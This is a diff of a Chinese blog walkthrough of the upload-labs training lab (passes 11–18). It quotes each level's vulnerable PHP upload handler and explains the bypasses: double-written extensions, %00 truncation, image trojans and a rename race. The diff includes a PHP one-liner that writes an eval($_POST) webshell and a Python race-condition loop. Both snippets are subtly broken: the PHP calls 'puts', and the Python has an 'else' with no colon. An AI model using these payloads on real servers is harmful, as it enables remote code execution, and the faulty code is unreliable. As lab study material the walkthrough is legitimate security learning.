class="string">"ini"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里用trim函数删去通过<code>$_FILES[&#39;upload_ext&#39;][&#39;tmp_name&#39;]</code>得到的浏览器通过报文传过来的在burpsuite中的变量名是filename的字符串左右两边的空格    这就省了几步过滤</p>
 <p>但是下面这句</p>
 <p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p>
@@ -480,25 +356,7 @@ if (isset($_POST[&#39;submit&#39;])) {
 <p>于是这里可以双写绕过</p>
 <p><code>.pphphp</code></p>
 <h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><p>这次使用了白名单过滤</p>
-<pre><code class="php">$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
-    if(in_array($file_ext,$ext_arr)){
-        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &#39;上传出错！&#39;;
-        }
-    } else{
-        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
-    }
-}
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>讲一下00截断的原理，在服务器读到十六进制编码为00时就会停止读取，而save_path是通过GET传参的00的GET传参的数据最终都会经过URL解码而%00解码之后就是十六进制对应的00，这就导致move_uploaded_file函数会读到00就结束从而上传成功</p>
 </blockquote>
@@ -506,158 +364,16 @@ if(isset($_POST[&#39;submit&#39;])){
 <h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><p>代码和十二关一样，只是save_path改用POST传参了</p>
 <p>burpsuite自带的16进制编辑器改16进制</p>
 <p>找到文件名后缀后面的0被改为00</p>
-<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><pre><code class="php">function getReailFileType($filename){
-    $file = fopen($filename, &quot;rb&quot;);//以只读 二进制方式打开
-    $bin = fread($file, 2); //只读2字节
-    fclose($file);
-    $strInfo = @unpack(&quot;C2chars&quot;, $bin);//从二进制字符串对数据进行解包
-    //&#39;C2char&#39;的意思是二进制文件类型是&#39;unsigned char&#39;转换为char类型最终返回值是一个数组。之后将数组返还给$strinfo函数。
-    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);//将$strinfo中的每一个元素转变为int型并且拼接输出给 $typeCode
-    $fileType = &#39;&#39;;    
-    switch($typeCode){//switch匹配      
-        case 255216:            
-            $fileType = &#39;jpg&#39;;
-            break;
-        case 13780:            
-            $fileType = &#39;png&#39;;
-            break;        
-        case 7173:            
-            $fileType = &#39;gif&#39;;
-            break;
-        default:            
-            $fileType = &#39;unknown&#39;;
-        }    
-        return $fileType;
-}
-
-$is_upload = false;
-$msg = null;
-if(isset($_POST[&#39;submit&#39;])){
-    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-    $file_type = getReailFileType($temp_file);
-
-    if($file_type == &#39;unknown&#39;){
-        $msg = &quot;文件未知，上传失败！&quot;;
-    }else{
-        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
-        if(move_uploaded_file($temp_file,$img_path)){
-            $is_upload = true;
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-    }
-}
-</code></pre>
+<h1 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);<span class="comment">//以只读 二进制方式打开</span></span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);<span class="comment">//从二进制字符串对数据进行解包</span></span><br><span class="line">    <span class="comment">//'C2char'的意思是二进制文件类型是'unsigned char'转换为char类型最终返回值是一个数组。之后将数组返还给$strinfo函数。</span></span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);<span class="comment">//将$strinfo中的每一个元素转变为int型并且拼接输出给 $typeCode</span></span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;<span class="comment">//switch匹配      </span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里本质上是检验的文件头</p>
 <p>只要做个文件头正确的图片🐎即可</p>
-<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><pre><code class="php">function isImage($filename){
-    $types = &#39;.jpeg|.png|.gif&#39;;
-    if(file_exists($filename)){
-        $info = getimagesize($filename);//获取文件信息
-        $ext = image_type_to_extension($info[2]);//返回文件后缀
-        if(stripos($types,$ext)&gt;=0){
-            return $ext;
-        }else{
-            return false;
-        }
-    }else{
-        return false;
-    }
-}
-</code></pre>
+<h1 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);<span class="comment">//获取文件信息</span></span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);<span class="comment">//返回文件后缀</span></span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里上传图片🐎即可</p>
-<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><pre><code class="php">$image_type = exif_imagetype($filename);
-</code></pre>
+<h1 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure>
 <p>这里的函数替代15关的</p>
-<pre><code class="php">$info = getimagesize($filename);//获取文件信息
-$ext = image_type_to_extension($info[2]);//返回文件后缀
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);<span class="comment">//获取文件信息</span></span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);<span class="comment">//返回文件后缀</span></span><br></pre></td></tr></table></figure>
 <p>还是图片🐎即可</p>
-<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-if (isset($_POST[&#39;submit&#39;])){
-    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
-    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
-    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-
-    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);
-
-    // 获得上传文件的扩展名
-    $fileext= substr(strrchr($filename,&quot;.&quot;),1);
-
-    //判断文件后缀与类型，合法才进行上传操作
-    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefromjpeg($target_path);
-
-            if($im == false){
-                $msg = &quot;该文件不是jpg格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.jpg&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagejpeg($im,$img_path);
-                @unlink($target_path);
-                $is_upload = true;
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-
-    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefrompng($target_path);
-
-            if($im == false){
-                $msg = &quot;该文件不是png格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                 //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.png&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagepng($im,$img_path);
-
-                @unlink($target_path);
-                $is_upload = true;               
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-
-    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
-        if(move_uploaded_file($tmpname,$target_path)){
-            //使用上传的图片生成新的图片
-            $im = imagecreatefromgif($target_path);
-            if($im == false){
-                $msg = &quot;该文件不是gif格式的图片！&quot;;
-                @unlink($target_path);
-            }else{
-                //给新图片指定文件名
-                srand(time());
-                $newfilename = strval(rand()).&quot;.gif&quot;;
-                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
-                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
-                imagegif($im,$img_path);
-
-                @unlink($target_path);
-                $is_upload = true;
-            }
-        } else {
-            $msg = &quot;上传出错！&quot;;
-        }
-    }else{
-        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
-    }
-}
-</code></pre>
+<h1 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里进行了许多步过滤</p>
 <p>简单总结下主要的就是</p>
 <ol>
@@ -669,30 +385,7 @@ if (isset($_POST[&#39;submit&#39;])){
 <p>也可以用010editor比较二次渲染前后的图片</p>
 <p>蓝色的部分是未被改变的</p>
 <p>可以在那里插入🐎</p>
-<h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><pre><code class="php">$is_upload = false;
-$msg = null;
-
-if(isset($_POST[&#39;submit&#39;])){
-    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
-    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
-    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
-    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
-    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;
-
-    if(move_uploaded_file($temp_file, $upload_file)){
-        if(in_array($file_ext,$ext_arr)){
-             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
-             rename($upload_file, $img_path);
-             $is_upload = true;
-        }else{
-            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
-            unlink($upload_file);
-        }
-    }else{
-        $msg = &#39;上传出错！&#39;;
-    }
-}
-</code></pre>
+<h1 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里过滤的挺充分的</p>
 <p>不过黑客大佬们还是有方法</p>
 <p>原理简单来说是</p>
@@ -703,8 +396,7 @@ if(isset($_POST[&#39;submit&#39;])){
 <li>访问成功后      木马也就被重新写入</li>
 </ol>
 <p>写入木马的木马</p>
-<pre><code class="php">&lt;?php puts(fopen(&#39;shell.php&#39;,&#39;r+&#39;),&#39;&lt;? @eval($_POST[&#39;shell&#39;]);?&gt;&#39;);?&gt;//发送的木马
-</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> puts(fopen(<span class="string">'shell.php'</span>,<span class="string">'r+'</span>),<span class="string">'&lt;? @eval($_POST['</span>shell<span class="string">']);?&gt;'</span>);<span class="meta">?&gt;</span><span class="comment">//发送的木马</span></span><br></pre></td></tr></table></figure>
 <p>重复发送利用burp实现</p>
 <ol>
 <li>用burpsuite抓包</li>
@@ -713,87 +405,15 @@ if(isset($_POST[&#39;submit&#39;])){
 <li>点击下方的continue indefinitely</li>
 </ol>
 <p>连续访问利用脚本实现</p>
-<pre><code class="python">import requests
-url = &quot;http://ip/upload-labs/upload/shell.php&quot;
-while True:
-        html = requests.get(url)
-        if html.status_code == 200:
-            print(&quot;success&quot;)
-            break
-         else
-            print(&quot;200&quot;)
-
-</code></pre>
